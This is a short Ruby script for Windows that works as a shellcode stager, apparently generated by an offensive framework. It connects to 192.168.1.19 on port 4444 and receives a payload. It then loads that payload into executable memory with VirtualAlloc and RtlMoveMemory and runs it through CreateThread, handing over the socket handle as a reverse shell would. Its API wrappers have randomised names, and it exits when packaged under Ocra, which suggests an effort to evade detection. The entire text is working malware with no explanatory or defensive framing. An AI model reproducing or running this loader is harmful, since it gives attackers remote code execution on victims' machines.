require 'rubygems';require 'win32/api';require 'socket';include Win32
exit if Object.const_defined?(:Ocra)
$VXiEmp = API.new('VirtualAlloc', 'IIII', 'I');$FqcRDAQ = API.new('RtlMoveMemory', 'IPI', 'V');$lBCbrJfXB = API.new('CreateThread', 'IIIIIP', 'I');$GsQzGacD = API.new('WaitForSingleObject', 'II', 'I')
$g_o = API.new('_get_osfhandle', 'I', 'I', 'msvcrt.dll')
def g(ip,port)
	begin
		s = TCPSocket.open(ip, port)
		pl = Integer(s.recv(4).unpack('L')[0])
		p = "     "
		while p.length < pl
		p += s.recv(pl) end
		p[0] = ['BF'].pack("H*")
		sd = $g_o.call(s.fileno)
		for i in 1..4
			p[i] = Array(sd).pack('V')[i-1] end
		return p
	rescue
	return ""
	end
end
def ij(sc)
	if sc.length > 1000
		pt = $VXiEmp.call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)
		x = $FqcRDAQ.call(pt,sc,sc.length)
		x = $GsQzGacD.call($lBCbrJfXB.call(0,0,pt,0,0,0),0xFFFFFFF)
	end
end
ij(g("192.168.1.19",4444))
